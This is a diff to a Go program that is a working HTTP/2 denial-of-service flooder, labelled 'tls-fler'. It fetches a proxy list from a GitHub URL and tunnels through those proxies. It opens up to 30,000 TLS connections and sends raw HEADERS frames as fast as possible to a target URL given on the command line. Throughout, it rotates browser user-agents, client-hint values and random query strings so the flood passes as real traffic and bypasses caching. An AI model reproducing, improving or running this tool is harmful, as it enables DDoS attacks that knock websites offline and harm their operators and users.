@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
@@ -12,6 +13,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -21,34 +23,36 @@ import (
 	"golang.org/x/net/http2/hpack"
 )
 
-// ── constants ─────────────────────────────────────────────────────────────────
 const (
 	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
-
-	uaDesktop = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
-	uaMobile  = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
-
-	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
-	platformDesktop = `"Windows"`
-	platformMobile  = `"Android"`
-
-	mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"
-
-	// HTTP/2 client preface
-	h2Preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+	h2Preface   = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+	mejiChars   = "abcdefghijklmnopqrstuvwxyz0123456789"
 )
 
-var mejiSuffixes = []string{
-	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
-	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
-}
-
-// ── stats ─────────────────────────────────────────────────────────────────────
 var (
 	statTotal   int64
 	statSuccess int64
 	statFailed  int64
 )
+
+var uaList = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
+}
+
+var brandList = []string{
+	`"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`,
+	`"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"`,
+	`"Chromium";v="134", "Not=A?Brand";v="24", "Google Chrome";v="134"`,
+}
+
+var mejiSuffixes = []string{
+	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
+	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
+}
 
 // ── proxy pool ────────────────────────────────────────────────────────────────
 type proxy struct{ host, port, user, pass string }
@@ -81,7 +85,7 @@ func parseProxies(r io.Reader) []proxy {
 	return out
 }
 
-func fingerprint(list []proxy) string {
+func fp(list []proxy) string {
 	parts := make([]string, len(list))
 	for i, p := range list {
 		parts[i] = p.host + ":" + p.port
@@ -98,7 +102,7 @@ func newProxyPool(localPath string) (*proxyPool, error) {
 		resp.Body.Close()
 		if len(list) > 0 {
 			pp.list = list
-			pp.fp = fingerprint(list)
+			pp.fp = fp(list)
 			saveLocal(localPath, list)
 			fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(list))
 			return pp, nil
@@ -115,7 +119,7 @@ func newProxyPool(localPath string) (*proxyPool, error) {
 		return nil, fmt.Errorf("proxy file is empty")
 	}
 	pp.list = list
-	pp.fp = fingerprint(list)
+	pp.fp = fp(list)
 	fmt.Printf("[proxy] loaded %d proxies from local file\n", len(list))
 	return pp, nil
 }
@@ -135,8 +139,8 @@ func saveLocal(path string, list []proxy) {
 	}
 }
 
-func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
-	for range time.NewTicker(interval).C {
+func (pp *proxyPool) autoUpdate(localPath string) {
+	for range time.NewTicker(30 * time.Second).C {
 		resp, err := http.Get(proxyGitURL)
 		if err != nil || resp.StatusCode != 200 {
 			continue
@@ -146,7 +150,7 @@ func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
 		if len(list) == 0 {
 			continue
 		}
-		newFP := fingerprint(list)
+		newFP := fp(list)
 		pp.mu.Lock()
 		if newFP != pp.fp {
 			pp.list = list
@@ -170,7 +174,7 @@ func (pp *proxyPool) count() int {
 	return len(pp.list)
 }
 
-// ── random helpers ────────────────────────────────────────────────────────────
+// ── helpers ───────────────────────────────────────────────────────────────────
 func randStr(n int) string {
 	b := make([]byte, n)
 	for i := range b {
@@ -186,7 +190,7 @@ func resolveRand(s string) string {
 	return s
 }
 
-func randomMejiQuery() string {
+func randomQuery() string {
 	n := rand.Intn(3) + 1
 	pairs := make([]string, 0, n)
 	used := map[string]bool{}
@@ -205,90 +209,58 @@ func randomMejiQuery() string {
 }
 
 func buildPath(u *url.URL) string {
-	path := resolveRand(pathname(u))
-	q := randomMejiQuery()
-	if strings.Contains(path, "?") {
-		return path + "&" + q
-	}
-	return path + "?" + q
-}
-
-// url.URL doesn't have Pathname, helper:
-func pathname(u *url.URL) string {
 	p := u.Path
 	if p == "" {
 		p = "/"
 	}
-	return p
-}
-
-// ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────
-// Frame format: 24-bit length | 8-bit type | 8-bit flags | 31-bit stream id | payload
-
-func writeFrame(conn net.Conn, streamID uint32, frameType uint8, flags uint8, payload []byte) error {
-	header := make([]byte, 9)
-	// length (24 bit)
-	header[0] = byte(len(payload) >> 16)
-	header[1] = byte(len(payload) >> 8)
-	header[2] = byte(len(payload))
-	header[3] = frameType
-	header[4] = flags
-	binary.BigEndian.PutUint32(header[5:], streamID&0x7FFFFFFF)
-	_, err := conn.Write(append(header, payload...))
-	return err
-}
-
-func settingsFrame() []byte {
-	// SETTINGS: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0,
-	//           MAX_FRAME_SIZE=6291456, INITIAL_WINDOW_SIZE=262144
-	settings := [][2]uint32{
-		{0x1, 65536},
-		{0x2, 0},
-		{0x4, 6291456},
-		{0x6, 262144},
+	p = resolveRand(p)
+	sep := "?"
+	if strings.Contains(p, "?") {
+		sep = "&"
 	}
-	buf := make([]byte, 6*len(settings))
-	for i, s := range settings {
-		binary.BigEndian.PutUint16(buf[i*6:], uint16(s[0]))
-		binary.BigEndian.PutUint32(buf[i*6+2:], s[1])
+	return p + sep + randomQuery()
+}
+
+// ── HTTP/2 frame helpers ──────────────────────────────────────────────────────
+func h2Frame(streamID uint32, t uint8, flags uint8, payload []byte) []byte {
+	buf := make([]byte, 9+len(payload))
+	buf[0] = byte(len(payload) >> 16)
+	buf[1] = byte(len(payload) >> 8)
+	buf[2] = byte(len(payload))
+	buf[3] = t
+	buf[4] = flags
+	binary.BigEndian.PutUint32(buf[5:], streamID&0x7FFFFFFF)
+	copy(buf[9:], payload)
+	return buf
+}
+
+func settingsPayload() []byte {
+	s := [][2]uint32{{1, 65536}, {2, 0}, {4, 6291456}, {6, 262144}}
+	buf := make([]byte, 6*len(s))
+	for i, v := range s {
+		binary.BigEndian.PutUint16(buf[i*6:], uint16(v[0]))
+		binary.BigEndian.PutUint32(buf[i*6+2:], v[1])
 	}
 	return buf
 }
 
-func windowUpdateFrame(increment uint32) []byte {
-	buf := make([]byte, 4)
-	binary.BigEndian.PutUint32(buf, increment)
-	return buf
-}
-
-// readFrame reads exactly one HTTP/2 frame from conn.
-func readFrame(r *bufio.Reader) (frameType uint8, flags uint8, streamID uint32, payload []byte, err error) {
-	header := make([]byte, 9)
-	if _, err = io.ReadFull(r, header); err != nil {
-		return
-	}
-	length := int(header[0])<<16 | int(header[1])<<8 | int(header[2])
-	frameType = header[3]
-	flags = header[4]
-	streamID = binary.BigEndian.Uint32(header[5:]) & 0x7FFFFFFF
-	payload = make([]byte, length)
-	if length > 0 {
-		_, err = io.ReadFull(r, payload)
-	}
-	return
+func winUpdatePayload(inc uint32) []byte {
+	b := make([]byte, 4)
+	binary.BigEndian.PutUint32(b, inc)
+	return b
 }
 
 // ── proxy CONNECT → TLS ───────────────────────────────────────────────────────
-func dialTLS(px proxy, host string, port int) (*tls.Conn, error) {
-	proxyAddr := net.JoinHostPort(px.host, px.port)
-	raw, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
+func dialTLS(px proxy, host string, port int) (net.Conn, error) {
+	raw, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
 	if err != nil {
 		return nil, err
 	}
 
-	// CONNECT tunnel
-	connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Connection: Keep-Alive\r\n",
-		host, port, host, port)
+	connectReq := fmt.Sprintf(
+		"CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Connection: Keep-Alive\r\n",
+		host, port, host, port,
+	)
 	if px.user != "" {
 		auth := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
 		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
@@ -313,14 +285,13 @@ func dialTLS(px proxy, host string, port int) (*tls.Conn, error) {
 		return nil, fmt.Errorf("proxy CONNECT: %s", resp.Status)
 	}
 
-	// TLS over tunnel — ALPN h2
-	tlsCfg := &tls.Config{
+	tlsConn := tls.Client(raw, &tls.Config{
 		ServerName:         host,
 		InsecureSkipVerify: true,
 		NextProtos:         []string{"h2"},
-		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
 		MinVersion:         tls.VersionTLS12,
 		MaxVersion:         tls.VersionTLS13,
+		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
 		CipherSuites: []uint16{
 			tls.TLS_AES_128_GCM_SHA256,
 			tls.TLS_AES_256_GCM_SHA384,
@@ -332,8 +303,7 @@ func dialTLS(px proxy, host string, port int) (*tls.Conn, error) {
 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
 		},
-	}
-	tlsConn := tls.Client(raw, tlsCfg)
+	})
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
 		tlsConn.Close()
@@ -341,42 +311,56 @@ func dialTLS(px proxy, host string, port int) (*tls.Conn, error) {
 	}
 	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
 		tlsConn.Close()
-		return nil, fmt.Errorf("server did not negotiate h2")
+		return nil, fmt.Errorf("h2 not negotiated")
 	}
 	tlsConn.SetDeadline(time.Time{})
 	return tlsConn, nil
 }
 
-// ── HTTP/2 session ────────────────────────────────────────────────────────────
-func h2Session(conn *tls.Conn, targetURL *url.URL, rate int, deadline time.Time) {
+// ── HTTP/2 session — kirim frames secepat mungkin, mirip JS ──────────────────
+func h2Session(conn net.Conn, u *url.URL, ratelimit int, deadline time.Time) {
 	defer conn.Close()
 
-	conn.SetDeadline(time.Now().Add(30 * time.Second))
+	// send preface
+	var buf bytes.Buffer
+	buf.WriteString(h2Preface)
+	buf.Write(h2Frame(0, 0x4, 0, settingsPayload()))        // SETTINGS
+	buf.Write(h2Frame(0, 0x8, 0, winUpdatePayload(15663105))) // WINDOW_UPDATE
+	if _, err := conn.Write(buf.Bytes()); err != nil {
+		return
+	}
 
-	// send client preface + SETTINGS + WINDOW_UPDATE
-	conn.Write([]byte(h2Preface))
-	writeFrame(conn, 0, 0x4, 0, settingsFrame())        // SETTINGS
-	writeFrame(conn, 0, 0x8, 0, windowUpdateFrame(15663105)) // WINDOW_UPDATE
-
-	br := bufio.NewReader(conn)
-	streamID := uint32(1)
-
-	// goroutine: read server frames
+	// reader goroutine — drain server frames, reply to SETTINGS/PING
 	go func() {
-		enc := hpack.NewDecoder(4096, nil)
+		br := bufio.NewReaderSize(conn, 32*1024)
+		hdr := make([]byte, 9)
+		dec := hpack.NewDecoder(4096, nil)
 		for {
-			ft, flags, _, payload, err := readFrame(br)
-			if err != nil {
+			if _, err := io.ReadFull(br, hdr); err != nil {
 				return
 			}
+			length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
+			ft := hdr[3]
+			flags := hdr[4]
+			payload := make([]byte, length)
+			if length > 0 {
+				if _, err := io.ReadFull(br, payload); err != nil {
+					return
+				}
+			}
+
 			switch ft {
 			case 0x4: // SETTINGS
 				if flags&0x1 == 0 {
-					writeFrame(conn, 0, 0x4, 0x1, nil) // ACK
+					conn.Write(h2Frame(0, 0x4, 0x1, nil)) // ACK
 				}
-			case 0x8: // WINDOW_UPDATE (connection level) — ignore
-			case 0x1: // HEADERS — decode status
-				hdrs, err := enc.DecodeFull(payload)
+			case 0x6: // PING
+				conn.Write(h2Frame(0, 0x6, 0x1, payload)) // PONG
+			case 0x7: // GOAWAY
+				conn.Close()
+				return
+			case 0x1: // HEADERS — count status
+				hdrs, err := dec.DecodeFull(payload)
 				if err != nil {
 					continue
 				}
@@ -390,101 +374,94 @@ func h2Session(conn *tls.Conn, targetURL *url.URL, rate int, deadline time.Time)
 						}
 					}
 				}
-			case 0x6: // PING
-				writeFrame(conn, 0, 0x6, 0x1, payload) // PONG
-			case 0x7: // GOAWAY
-				conn.Close()
-				return
 			}
 		}
 	}()
 
-	// write HEADERS frames at rate
-	interval := time.Second / time.Duration(rate)
+	// writer — kirim HEADERS frames secepat mungkin sesuai ratelimit
+	// interval per request
+	interval := time.Duration(0)
+	if ratelimit > 0 {
+		interval = time.Second / time.Duration(ratelimit)
+	}
 
-	var hpackBuf strings.Builder
+	streamID := uint32(1)
+	var hpackBuf bytes.Buffer
 	enc := hpack.NewEncoder(&hpackBuf)
 
 	for time.Now().Before(deadline) {
-		conn.SetDeadline(time.Now().Add(30 * time.Second))
-
+		ua := uaList[rand.Intn(len(uaList))]
+		brand := brandList[rand.Intn(len(brandList))]
 		isMobile := rand.Intn(100) < 40
-		path := pathname(targetURL)
-		path = resolveRand(path)
-		path = path + "?" + randomMejiQuery()
-
-		var ua, platform, mobile string
+		mobile := "?0"
+		platform := `"Windows"`
 		if isMobile {
-			ua = uaMobile
-			platform = platformMobile
 			mobile = "?1"
-		} else {
-			ua = uaDesktop
-			platform = platformDesktop
-			mobile = "?0"
+			platform = `"Android"`
 		}
+		cacheCtrl := "no-cache"
+		if rand.Intn(2) == 0 {
+			cacheCtrl = "max-age=0"
+		}
+
+		path := buildPath(u)
 
 		hpackBuf.Reset()
-		headers := []hpack.HeaderField{
+		for _, h := range []hpack.HeaderField{
 			{Name: ":method", Value: "GET"},
-			{Name: ":authority", Value: targetURL.Hostname()},
+			{Name: ":authority", Value: u.Hostname()},
 			{Name: ":scheme", Value: "https"},
 			{Name: ":path", Value: path},
-			{Name: "user-agent", Value: ua},
-			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
-			{Name: "accept-encoding", Value: "gzip, deflate, br"},
-			{Name: "accept-language", Value: "en-US,en;q=0.9"},
-			{Name: "cache-control", Value: "no-cache"},
-			{Name: "sec-ch-ua", Value: secChUaVal},
+			{Name: "cache-control", Value: cacheCtrl},
+			{Name: "sec-ch-ua", Value: brand},
 			{Name: "sec-ch-ua-mobile", Value: mobile},
 			{Name: "sec-ch-ua-platform", Value: platform},
-			{Name: "sec-fetch-dest", Value: "document"},
-			{Name: "sec-fetch-mode", Value: "navigate"},
-			{Name: "sec-fetch-site", Value: "none"},
-			{Name: "sec-fetch-user", Value: "?1"},
 			{Name: "upgrade-insecure-requests", Value: "1"},
-			{Name: "dnt", Value: "1"},
-		}
-
-		for _, h := range headers {
+			{Name: "user-agent", Value: ua},
+			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
+			{Name: "sec-fetch-site", Value: "none"},
+			{Name: "sec-fetch-mode", Value: "navigate"},
+			{Name: "sec-fetch-user", Value: "?1"},
+			{Name: "sec-fetch-dest", Value: "document"},
+			{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
+			{Name: "accept-language", Value: "en-US,en;q=0.9"},
+			{Name: "priority", Value: "u=0, i"},
+		} {
 			enc.WriteField(h)
 		}
 
-		encoded := []byte(hpackBuf.String())
-		// prepend HPACK priority prefix (same as JS: 0x80,0,0,0,0xFF)
-		payload := append([]byte{0x80, 0, 0, 0, 0xFF}, encoded...)
+		// HEADERS frame: END_HEADERS(0x4) | END_STREAM(0x1) | PRIORITY(0x20)
+		encoded := hpackBuf.Bytes()
+		payload := make([]byte, 5+len(encoded))
+		payload[0] = 0x80
+		copy(payload[5:], encoded)
 
-		// END_HEADERS | END_STREAM | PRIORITY
-		err := writeFrame(conn, streamID, 0x1, 0x1|0x4|0x20, payload)
-		if err != nil {
+		frame := h2Frame(streamID, 0x1, 0x1|0x4|0x20, payload)
+		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+		if _, err := conn.Write(frame); err != nil {
 			return
 		}
 
 		atomic.AddInt64(&statTotal, 1)
 		streamID += 2
 
-		time.Sleep(interval)
+		if interval > 0 {
+			time.Sleep(interval)
+		}
 	}
 }
 
-// ── worker ────────────────────────────────────────────────────────────────────
-func worker(pool *proxyPool, targetURL *url.URL, rate int, duration time.Duration, wg *sync.WaitGroup) {
+// ── go: setiap goroutine buka conn baru terus menerus (mirip JS setInterval) ──
+func spawnConn(pool *proxyPool, u *url.URL, port int, ratelimit int, deadline time.Time, wg *sync.WaitGroup) {
 	defer wg.Done()
-
-	deadline := time.Now().Add(duration)
-	port := 443
-	if p := targetURL.Port(); p != "" {
-		port, _ = strconv.Atoi(p)
-	}
-
 	for time.Now().Before(deadline) {
 		px := pool.random()
-		conn, err := dialTLS(px, targetURL.Hostname(), port)
+		conn, err := dialTLS(px, u.Hostname(), port)
 		if err != nil {
 			atomic.AddInt64(&statFailed, 1)
 			continue
 		}
-		h2Session(conn, targetURL, rate, deadline)
+		h2Session(conn, u, ratelimit, deadline)
 	}
 }
 
@@ -500,12 +477,12 @@ func main() {
 	targetRaw := os.Args[1]
 	duration, err := strconv.Atoi(os.Args[2])
 	if err != nil || duration <= 0 {
-		fmt.Println("Error: duration must be a positive integer")
+		fmt.Fprintln(os.Stderr, "Error: duration must be a positive integer")
 		os.Exit(1)
 	}
 	rate, err := strconv.Atoi(os.Args[3])
 	if err != nil || rate <= 0 {
-		fmt.Println("Error: rate must be a positive integer")
+		fmt.Fprintln(os.Stderr, "Error: rate must be a positive integer")
 		os.Exit(1)
 	}
 
@@ -514,50 +491,59 @@ func main() {
 		localProxyPath = os.Args[4]
 	}
 
-	targetURL, err := url.Parse(targetRaw)
+	u, err := url.Parse(targetRaw)
 	if err != nil {
-		fmt.Printf("Error: invalid URL: %v\n", err)
+		fmt.Fprintf(os.Stderr, "Error: invalid URL: %v\n", err)
 		os.Exit(1)
 	}
 
 	pool, err := newProxyPool(localProxyPath)
 	if err != nil {
-		fmt.Printf("Error: %v\n", err)
+		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
 		os.Exit(1)
 	}
+	go pool.autoUpdate(localProxyPath)
 
-	go pool.autoUpdate(localProxyPath, 30*time.Second)
-
-	// concurrency: 1 goroutine per ~100 req/s, max 5000
-	concurrency := rate / 100
-	if concurrency < 1 {
-		concurrency = 1
+	port := 443
+	if p := u.Port(); p != "" {
+		port, _ = strconv.Atoi(p)
 	}
-	if concurrency > 5000 {
-		concurrency = 5000
+
+	// Gunakan semua CPU core
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	// Jumlah goroutine koneksi — mirip JS: 30000 conns tapi batasi wajar
+	// 1 goroutine = 1 koneksi aktif. Rate dibagi per-goroutine.
+	// Target: setiap goroutine kirim ~128 req/s (sama seperti JS ratelimit default)
+	conns := rate / 128
+	if conns < 1 {
+		conns = 1
+	}
+	if conns > 30000 {
+		conns = 30000
+	}
+	perConn := rate / conns
+	if perConn < 1 {
+		perConn = 1
 	}
 
 	dur := time.Duration(duration) * time.Second
-	perWorker := rate / concurrency
-	if perWorker < 1 {
-		perWorker = 1
-	}
+	deadline := time.Now().Add(dur)
 
-	fmt.Printf("Starting HTTP/2 + proxy tunnel to %s\n", targetURL)
-	fmt.Printf("Duration: %ds | Rate: %d req/s | Workers: %d | Proxies: %d\n\n",
-		duration, rate, concurrency, pool.count())
+	fmt.Printf("[tls-fler] target=%s duration=%ds rate=%d/s conns=%d proxies=%d\n",
+		u, duration, rate, conns, pool.count())
 
 	start := time.Now()
 	var wg sync.WaitGroup
-	for i := 0; i < concurrency; i++ {
+	for i := 0; i < conns; i++ {
 		wg.Add(1)
-		go worker(pool, targetURL, perWorker, dur, &wg)
+		go spawnConn(pool, u, port, perConn, deadline, &wg)
 	}
 	wg.Wait()
 
 	elapsed := time.Since(start).Seconds()
-	fmt.Println("========== SUMMARY ==========")
-	fmt.Printf("Target    : %s\n", targetURL)
+	fmt.Println("\n========== SUMMARY ==========")
+	fmt.Printf("Target    : %s\n", u)
 	fmt.Printf("Duration  : %.2fs\n", elapsed)
 	fmt.Printf("Total Req : %d\n", statTotal)
 	fmt.Printf("Success   : %d\n", statSuccess)
